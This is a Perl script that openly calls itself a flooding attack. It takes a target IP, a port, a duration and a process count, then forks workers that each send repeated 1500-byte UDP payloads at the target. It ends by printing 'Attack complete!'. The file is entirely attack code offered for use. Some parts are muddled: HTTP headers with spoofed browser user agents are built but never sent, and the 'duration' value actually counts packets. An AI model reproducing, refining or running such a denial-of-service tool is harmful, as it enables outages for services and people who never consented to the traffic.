#!/usr/bin/perl

use strict;
use IO::Socket::INET;

# Usage: perl script.pl <target_ip> <target_port> <duration_seconds> <num_threads>

my $target_ip = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
my $target_port = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
my $duration_seconds = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
my $num_threads = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";

my $payload = "A" x 1500; # Adjust payload size as needed

# User agents
my @user_agents = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
);

# Prepare headers
my $headers = "GET / HTTP/1.1\r\n";
$headers .= "Host: $target_ip:$target_port\r\n";
$headers .= "User-Agent: " . $user_agents[rand @user_agents] . "\r\n";
$headers .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
$headers .= "Accept-Language: en-US,en;q=0.5\r\n";
$headers .= "Accept-Encoding: gzip, deflate\r\n";
$headers .= "Connection: keep-alive\r\n";
$headers .= "\r\n";

# Flood function
sub flood {
    my $socket = IO::Socket::INET->new(
        PeerAddr => $target_ip,
        PeerPort => $target_port,
        Proto => 'udp'
    ) or return;

    for (1 .. $duration_seconds) {
        print $socket $payload;
        select(undef, undef, undef, 0.001); # Adjust delay between packets
    }

    close($socket);
}

# Create threads
for (1 .. $num_threads) {
    my $pid = fork();
    if ($pid) {
        # Parent process
    } elsif ($pid == 0) {
        # Child process
        flood();
        exit(0);
    } else {
        die "Error: Unable to fork: $!\n";
    }
}

# Wait for child processes to finish
for (1 .. $num_threads) {
    wait();
}

print "Attack complete!\n";
